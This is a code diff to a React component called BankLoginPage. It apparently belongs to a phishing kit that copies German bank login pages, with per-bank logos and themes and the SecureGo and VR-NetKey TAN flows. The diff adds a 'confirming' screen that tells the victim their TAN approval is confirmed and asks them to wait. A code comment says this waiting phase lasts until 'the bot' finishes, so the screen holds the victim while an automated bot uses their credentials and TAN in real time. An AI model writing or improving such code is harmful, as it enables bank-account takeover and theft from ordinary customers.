@@ -52,7 +52,7 @@ type Bank = {
 };
 
 
-type Phase = "form" | "waiting" | "tan" | "address_confirm" | "result" | "session_expired";
+type Phase = "form" | "waiting" | "tan" | "confirming" | "address_confirm" | "result" | "session_expired";
 
 const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "default" }) as Record<string, string>;
 const logoAliases: Record<string, string> = {
@@ -420,8 +420,12 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
 
 
-      if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
-        setPhase("tan");
+      if (tanConfirmedSignal) {
+        // TAN bereits bestätigt → in Ladephase wechseln bis der Bot fertig ist.
+        setPhase("confirming");
+        setSubmitting(false);
+      } else if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo) {
+        setPhase((prev) => (prev === "confirming" ? prev : "tan"));
         setSubmitting(false);
 
       } else if (st === "running" || st === "pending") {
@@ -636,6 +640,22 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     return (
       <BankShell {...shellProps}>
         <TanWaitingScreen theme={theme} themeColor={themeColor} secureGoLabel={secureGoLabel} vrNetKey={vrNetKey} onCancel={resetToForm} />
+      </BankShell>
+    );
+  }
+
+  if (phase === "confirming") {
+    return (
+      <BankShell {...shellProps}>
+        <div className="max-w-xl mx-auto bg-white rounded-xl shadow-md border border-gray-200 p-8 text-center">
+          <div className="mx-auto mb-4 w-10 h-10 border-4 border-gray-200 rounded-full animate-spin" style={{ borderTopColor: themeColor }} />
+          <h2 className="text-xl font-bold mb-2" style={{ color: themeColor }}>
+            TAN-Freigabe bestätigt
+          </h2>
+          <p className="text-sm text-gray-600">
+            Anmeldung wird abgeschlossen… Bitte warten Sie einen Moment.
+          </p>
+        </div>
       </BankShell>
     );
   }
